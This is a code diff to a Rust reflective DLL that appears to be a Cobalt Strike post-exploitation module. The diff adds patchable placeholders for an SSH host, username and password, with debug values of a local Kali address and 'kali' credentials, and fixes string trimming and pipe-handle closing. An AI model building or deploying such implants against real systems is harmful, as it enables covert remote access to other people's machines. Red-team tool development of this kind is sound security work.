@@ -19,12 +19,17 @@ use ssh2::Session;
 // IPv4 ADDRESS IS STOMPED IN BY .CNA
 #[cfg(not(debug_assertions))]
 pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"255.255.255.255\0\0\0\0\0";
-
+#[cfg(not(debug_assertions))]
+pub static USERNAME_STRING: &[u8; 66] = b"USERNAME_STRING_NO_CHANGE_PLS_USERNAME_STRING_NO_CHANGE_PLS_____\0\0";
+#[cfg(not(debug_assertions))]
+pub static PASSWORD_STRING: &[u8; 66] = b"PASSWORD_STRING_NO_CHANGE_PLS_PASSWORD_STRING_NO_CHANGE_PLS_____\0\0";
 #[cfg(debug_assertions)]
-pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.228\0\0\0\0\0\0\0";
+pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.18\0\0\0\0\0\0\0\0";
+#[cfg(debug_assertions)]
+pub static USERNAME_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
+#[cfg(debug_assertions)]
+pub static PASSWORD_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 
-pub static USERNAME_STRING: &[u8; 64] = b"USERNAME_STRING_NO_CHANGE_PLS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
-pub static PASSWORD_STRING: &[u8; 64] = b"PASSWORD_STRING_NO_CHANGE_PLS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 const SSH_PORT: u16 = 22;
 
 /// Entry point for the custom Rust-based DLL.
@@ -50,7 +55,7 @@ pub fn dll_main() {
     };
 
     // Convert the IP address bytes to string more efficiently
-    let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS);
+    let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS).clone().trim_end_matches(char::from(0)).to_string();
     let server_address = format!("{}:{}", ip_address, SSH_PORT);
 
     dbg!(&server_address);
@@ -71,6 +76,13 @@ pub fn dll_main() {
     println!("{}", s);
     // Write output to the pipe
     // write_output("Hello from the Rust Reflective DLL via output!");
+
+    // Close Handles
+    unsafe{
+        CloseHandle(h_input_pipe);
+        CloseHandle(h_output_pipe);
+    }
+
 }
 
 /// Retrieves the instruction pointer (IP) on the `x86_64` architecture.
